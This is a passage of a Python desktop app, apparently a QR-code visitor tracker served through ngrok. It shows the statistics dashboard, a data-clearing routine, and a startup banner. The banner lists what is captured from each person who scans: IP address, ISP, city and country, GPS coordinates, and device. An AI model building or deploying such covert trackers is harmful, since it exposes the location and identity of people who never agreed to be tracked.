║                    📊 VISITOR TRACKING STATISTICS                    ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                       ║
║  Total Visits:          {len(data)}
║  Unique Visitors:       {len(unique_ips)}
║  Countries:             {len(countries)}
║  Mobile Users:          {mobile}
║  Desktop Users:         {len(data) - mobile}
║                                                                       ║
╠══════════════════════════════════════════════════════════════════════╣
║                    🆕 RECENT VISITORS (Last 10)                      ║
╠══════════════════════════════════════════════════════════════════════╣
"""
        
        for row in reversed(data[-10:]):
            timestamp = row.get('timestamp', 'N/A')[:19]
            ip = row.get('ip', 'N/A')
            city = row.get('city', 'N/A')
            country = row.get('country', 'N/A')
            isp = row.get('isp', 'N/A')
            device = '📱 Mobile' if row.get('userAgent') and 'Mobile' in row['userAgent'] else '💻 Desktop'
            
            stats += f"\n  ⏰ {timestamp}"
            stats += f"\n     🌐 IP: {ip} | {device}"
            stats += f"\n     📍 Location: {city}, {country}"
            stats += f"\n     🏢 ISP: {isp[:40]}"
            stats += "\n     " + "-"*50
        
        stats += "\n╚══════════════════════════════════════════════════════════════════════╝"
        
        self.stats_text.insert(1.0, stats)
    
    def clear_all_data(self):
        if messagebox.askyesno("Confirm", "⚠️ This will delete ALL visitor tracking data!\n\nAre you sure?"):
            if os.path.exists(CSV_FILE):
                os.remove(CSV_FILE)
                with open(CSV_FILE, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['timestamp', 'ip', 'city', 'region', 'country', 'country_code', 
                                    'postal', 'latitude', 'longitude', 'isp', 'timezone_ip', 'gps_latitude', 
                                    'gps_longitude', 'gps_accuracy', 'userAgent', 'platform', 'language', 
                                    'screenSize', 'timezone', 'referrer', 'url'])
            self.refresh_stats()
            messagebox.showinfo("Success", "All tracking data has been cleared!")

def main():
    print("="*70)
    print("   🌍 QR Code Visitor Tracker with ngrok - Global Tracking!")
    print("="*70)
    print("\nThis tool creates a public URL using ngrok that works from ANYWHERE!")
    print("\nWHAT HAPPENS WHEN SOMEONE SCANS YOUR QR CODE:")
    print("  • Their location (Country, City) is captured")
    print("  • Their IP address and ISP are recorded")
    print("  • Their device type (Mobile/Desktop) is detected")
    print("  • GPS coordinates (if they allow)")
    print("  • Date and time of scan")
    print("\n✨ All data appears LIVE on your screen and dashboard!")
    print("="*70 + "\n")
    
    # Check if pyngrok is installed
    try:
        import pyngrok
    except ImportError:
        print("⚠️ pyngrok not installed! Installing...")
        os.system("pip install pyngrok")
        print("✅ pyngrok installed!\n")
    
    root = tk.Tk()
    app = QRCodeTrackerApp(root)
    
    def on_closing():
        try:
            ngrok.kill()
        except:
            pass
        if messagebox.askokcancel("Quit", "Stop tracking server and quit?"):
            root.destroy()
            os._exit(0)
    
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()

if __name__ == "__main__":
    main()
